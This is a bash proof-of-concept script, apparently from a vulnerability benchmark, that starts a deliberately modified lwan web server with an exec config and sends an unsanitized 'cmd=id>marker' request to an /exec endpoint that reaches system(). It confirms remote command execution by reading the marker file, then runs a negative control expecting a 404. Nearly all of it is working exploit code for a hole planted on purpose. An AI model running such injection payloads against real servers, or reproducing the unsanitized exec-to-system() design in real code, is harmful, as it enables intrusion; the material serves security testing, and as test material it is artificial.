#!/usr/bin/env bash
# PoC for 173_lwan_C2I3S1
# Axes: C2 (config file gate) / I3 (struct dispatch) / S1 (no sanitization)
#
# Gate: exec_mode and exec_logging from --exec-config file.
# S1: no sanitization. I3: cmd via exec_args_t struct to dispatch_exec() -> system().
#
# Usage: ./PoC.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/lwan"
WWWROOT="/tmp/poc_173_www"
MARKER="/tmp/poc_173_marker"
PORT=18173
NEG_PORT=19173
EXEC_CONF="/tmp/poc_173_exec.conf"

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY -- run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && {
        kill "$SERVER_PID" 2>/dev/null || true
        pkill -KILL -P "$SERVER_PID" 2>/dev/null || true
        wait "$SERVER_PID" 2>/dev/null || true
    }
    fuser -k ${PORT}/tcp 2>/dev/null || true
    rm -rf "$WWWROOT" "$MARKER" "$EXEC_CONF"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

cat > "$EXEC_CONF" <<CONFEOF
exec_mode = 1
exec_logging = 1
CONFEOF

echo "[*] starting lwan with --exec-config on port $PORT..."
"$BINARY" -r "$WWWROOT" -l "*:$PORT" --exec-config "$EXEC_CONF" &
SERVER_PID=$!
sleep 1.0

# S1: no sanitization
echo "[*] sending payload (S1 — no sanitization): cmd=id>${MARKER}"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null || true
sleep 0.3

if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found -- exploit failed"
    exit 1
fi

# Negative control
echo "[*] verifying gate: endpoint must return 404 without --exec-config..."
kill "$SERVER_PID" 2>/dev/null || true
pkill -KILL -P "$SERVER_PID" 2>/dev/null || true
fuser -k ${PORT}/tcp 2>/dev/null || true
wait "$SERVER_PID" 2>/dev/null || true
SERVER_PID=0
sleep 0.3

"$BINARY" -r "$WWWROOT" -l "*:$NEG_PORT" &
SAFE_PID=$!
sleep 1.0
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || echo "000")
kill "$SAFE_PID" 2>/dev/null || true
pkill -KILL -P "$SAFE_PID" 2>/dev/null || true
fuser -k ${NEG_PORT}/tcp 2>/dev/null || true
wait "$SAFE_PID" 2>/dev/null || true

if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without --exec-config"
else
    echo "[!] gate check: unexpected response $HTTP_CODE (expected 404)"
fi
